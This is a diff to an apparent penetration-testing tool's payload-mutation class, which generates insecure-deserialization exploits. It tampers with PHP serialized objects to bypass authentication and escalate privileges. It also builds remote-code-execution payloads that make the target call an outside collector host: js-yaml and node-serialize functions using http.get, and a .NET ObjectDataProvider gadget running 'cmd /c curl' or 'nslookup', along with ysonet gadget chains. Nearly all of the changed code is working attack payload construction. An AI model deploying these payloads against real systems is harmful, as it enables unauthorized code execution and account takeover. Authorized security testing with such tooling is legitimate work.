@@ -660,6 +660,19 @@ class PayloadMutation:
             return {"start": pos, "end": i, "kind": kind}
         return None
 
+    @staticmethod
+    def _php_bytes(text: str) -> bytes:
+        """Back to bytes under the pipeline's latin-1 convention: a candidate decoded from
+        base64/url/hex holds one char per byte, so latin-1 restores the exact bytes. The old
+        `.encode()` (UTF-8) doubled every byte >= 0x80 — PHP `s:5:"José"` went out as
+        bytes `Jos C3 83 C2 A9` (7 bytes vs s:5) and unserialize() failed (bug I, 2026-11-21).
+        A candidate taken straight from a text HAR body may hold real chars > 0xFF ('ẻ');
+        those were never byte dumps, so they go out as UTF-8."""
+        try:
+            return text.encode("latin-1")
+        except UnicodeEncodeError:
+            return text.encode("utf-8")
+
     def _iter_php_pairs(
         self, payload: str, start: int = 0, end: int | None = None, depth: int = 0
     ) -> list[tuple[dict | None, dict]]:
@@ -709,7 +722,7 @@ class PayloadMutation:
             if key_tok is None or not any(h in key_tok["content"].lower() for h in self.TOKEN_HINTS):
                 continue
             mutated = payload[:val_tok["start"]] + "i:0;" + payload[val_tok["end"]:]
-            encode_mutated = base64.b64encode(mutated.encode()).decode()
+            encode_mutated = base64.b64encode(self._php_bytes(mutated)).decode()
             p = self._make_payload("type_juggle", f'{key_tok["content"]}->i:0', None, encode_mutated)
             p["note"] = "PHP type juggling: token/secret string field changed to integer 0 (0 == non-numeric string is true in PHP < 8.0)"
             results.append(p)
@@ -726,7 +739,7 @@ class PayloadMutation:
             mutated = payload
             for val_tok, new_tok in sorted(repls, key=lambda r: r[0]["start"], reverse=True):
                 mutated = mutated[:val_tok["start"]] + new_tok + mutated[val_tok["end"]:]
-            encode_mutated = base64.b64encode(mutated.encode()).decode()
+            encode_mutated = base64.b64encode(self._php_bytes(mutated)).decode()
             p = self._make_payload(
                 "type_juggle_privesc",
                 f'{priv[0]["content"]}=administrator + {secret[0]["content"]}=i:0',
@@ -746,7 +759,7 @@ class PayloadMutation:
             flipped = "1" if payload[val_tok["start"] + 2] == "0" else "0"
             new_token = f"b:{flipped};"
             mutated = payload[:val_tok["start"]] + new_token + payload[val_tok["end"]:]
-            encode_mutated = base64.b64encode(mutated.encode()).decode()
+            encode_mutated = base64.b64encode(self._php_bytes(mutated)).decode()
             results.append(self._make_payload("flip_boolean", None, None, encode_mutated))
         return results
 
@@ -768,7 +781,7 @@ class PayloadMutation:
                     continue
                 new_token = f's:{len(new_val)}:"{new_val}";'
                 mutated = payload[:val_tok["start"]] + new_token + payload[val_tok["end"]:]
-                encode_mutated = base64.b64encode(mutated.encode()).decode()
+                encode_mutated = base64.b64encode(self._php_bytes(mutated)).decode()
                 results.append(self._make_payload("modify_string", None, None, encode_mutated))
 
         return results
@@ -789,7 +802,7 @@ class PayloadMutation:
                     continue
                 new_token = f"i:{new_val};"
                 mutated = payload[:val_tok["start"]] + new_token + payload[val_tok["end"]:]
-                encode_mutated = base64.b64encode(mutated.encode()).decode()
+                encode_mutated = base64.b64encode(self._php_bytes(mutated)).decode()
                 results.append(self._make_payload("modify_integer", None, None, encode_mutated))
 
         return results
@@ -937,9 +950,12 @@ class PayloadMutation:
         oob_domain = get_oob_domain()
         if oob_domain:
             url = f"http://{oob_domain}/"
+            # .on('error', …) keeps a refused canary connection from crashing the target
+            # process (same reason as node_serialize_oob — note 2026-11-22 J).
             raw = (
                 "hook: !<tag:yaml.org,2002:js/function> "
-                f'"function(){{ return global.process.mainModule.require(\'http\').get(\'{url}\'); }}"'
+                f'"function(){{ return global.process.mainModule.require(\'http\').get(\'{url}\')'
+                f'.on(\'error\',function(){{}}); }}"'
             )
             b64 = base64.b64encode(raw.encode()).decode()
             payload = self._make_payload("yaml_js_function_oob", "js-yaml !!js/function: http.get", url, b64)
@@ -1144,7 +1160,14 @@ class PayloadMutation:
             oob_domain = get_oob_domain()
             if oob_domain:
                 url = f"http://{oob_domain}/"
-                inner = "_$$ND_FUNC$$_function(){" + f"require('http').get('{url}');" + "}()"
+                # .on('error', …) is required: the canary host resolves (DNS hit is logged) but
+                # the TCP connect is usually refused; without a listener Node raises an
+                # unhandled 'error' event and the whole target process exits (note 2026-11-22 J).
+                inner = (
+                    "_$$ND_FUNC$$_function(){"
+                    + f"require('http').get('{url}').on('error',function(){{}});"
+                    + "}()"
+                )
                 raw = inner if bare else '{"oob":"' + inner + '"}'
                 b64 = base64.b64encode(raw.encode()).decode()
                 payload = self._make_payload("node_serialize_oob", "node-serialize IIFE: http.get", url, b64)
@@ -1353,6 +1376,39 @@ class PayloadMutation:
             results.append(payload)
         return results
 
+    # Callback commands for the .NET OOB canaries (same template-list pattern as Java's
+    # RCE_ESCALATION_OOB_COMMANDS). curl.exe only ships with Windows 10 1803+/Server 2019+,
+    # so legacy .NET Framework hosts (Server 2012/2016, Win7) fail `cmd /c curl` BEFORE any
+    # DNS lookup. nslookup exists on every Windows version and the DNS query for
+    # <token>.<domain> alone is what the collector logs (verified 2026-11-24, note.md).
+    DOTNET_OOB_COMMANDS = [
+        "curl {url}",
+        "nslookup {host}",
+    ]
+
+    @staticmethod
+    def _oob_dns_host(oob_domain: str) -> str:
+        """The bare DNS name to look up, or '' when the OOB address can't carry its token in
+        a DNS query (path form like '127.0.0.1:9000/<token>' or 'host/<token>' — the token
+        lives in the URL path, which nslookup never sends)."""
+        d = (oob_domain or "").strip().rstrip("/")
+        if not d or "/" in d or ":" in d:
+            return ""
+        labels = d.split(".")
+        if len(labels) == 4 and all(lbl.isdigit() for lbl in labels):
+            return ""
+        return d
+
+    def _dotnet_oob_commands(self, oob_domain: str) -> list:
+        url = f"http://{oob_domain}/"
+        host = self._oob_dns_host(oob_domain)
+        cmds = []
+        for tpl in self.DOTNET_OOB_COMMANDS:
+            if "{host}" in tpl and not host:
+                continue
+            cmds.append(tpl.format(url=url, host=host))
+        return cmds
+
     def _mutate_dotnet_oob(self) -> Mutations:
         """Blind-confirmation variant for .NET deserialization: emit gadget payloads whose command
         makes the target fetch the OOB collector over HTTP (token carried in the URL path), so a
@@ -1367,38 +1423,50 @@ class PayloadMutation:
         if not oob_domain:
             return []
         url = f"http://{oob_domain}/"
+        commands = self._dotnet_oob_commands(oob_domain)
         results: Mutations = []
+        formatter = self._resolve_dotnet_formatter()
+        if formatter == "Json.Net":
+            for command in commands:
+                results.extend(self._dotnet_jsonnet_oob_payload(url, command))
 
+        if os.path.exists(self.YSONET_PATH):
+            for gadget in self.DOTNET_GADGETS:
+                for command in commands:
+                    kind = "dns" if command.startswith("nslookup") else "http"
+                    b64 = self._run_ysonet(formatter, gadget, command)
+                    if b64:
+                        payload = self._make_payload("dotnet_ysonet_oob", f"{formatter}/{gadget}: {kind} callback", command, b64)
+                        payload["note"] = (
+                            f"Blind OOB canary via ysonet ({command.split()[0]}) — check {oob_domain}'s collector "
+                            "log for an inbound callback on this vector's token to confirm the gadget executed on the target."
+                        )
+                        results.append(payload)
+        return results
+
+    def _dotnet_jsonnet_oob_payload(self, url: str, command: str = "") -> Mutations:
+        """Hand-built Json.NET $type ObjectDataProvider OOB canary. Only meaningful for a Json.NET
+        ($type) sink — sending this JSON text to a BinaryFormatter/ViewState sink is a format mismatch
+        that just produces a parse-error 500 (bug G, 2026-11-21: /api/import-bin got '7B-22-24-74…')."""
+        command = command or f"curl {url}"
+        kind = "dns" if command.startswith("nslookup") else "http"
         raw = (
             '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, '
             'Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",'
             '"MethodName":"Start",'
             '"MethodParameters":{"$type":"System.Collections.ObjectModel.ObservableCollection`1'
             '[[System.String, mscorlib]], System.ObjectModel",'
-            f'"$values":["cmd","/c curl {url}"]}},'
+            f'"$values":["cmd","/c {command}"]}},'
             '"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}'
         )
         b64 = base64.b64encode(raw.encode()).decode()
-        payload = self._make_payload("dotnet_jsonnet_oob", "ObjectDataProvider: http callback", url, b64)
+        payload = self._make_payload("dotnet_jsonnet_oob", f"ObjectDataProvider: {kind} callback", url, b64)
         payload["payload_raw"] = raw
         payload["note"] = (
             f"Blind OOB canary — if TypeNameHandling.All deserializes this, the target fetches {url}; "
             "check the collector log for this vector's token. Needs classic .NET Framework (WPF GAC)."
         )
-        results.append(payload)
-
-        if os.path.exists(self.YSONET_PATH):
-            formatter = self._resolve_dotnet_formatter()
-            for gadget in self.DOTNET_GADGETS:
-                b64 = self._run_ysonet(formatter, gadget, f"curl {url}")
-                if b64:
-                    payload = self._make_payload("dotnet_ysonet_oob", f"{formatter}/{gadget}: http callback", f"curl {url}", b64)
-                    payload["note"] = (
-                        f"Blind OOB canary via ysonet — check {oob_domain}'s collector log for an inbound "
-                        "callback on this vector's token to confirm the gadget executed on the target."
-                    )
-                    results.append(payload)
-        return results
+        return [payload]
 
 
     GOPHERUS_PATH = get_tool_path("gopherus")
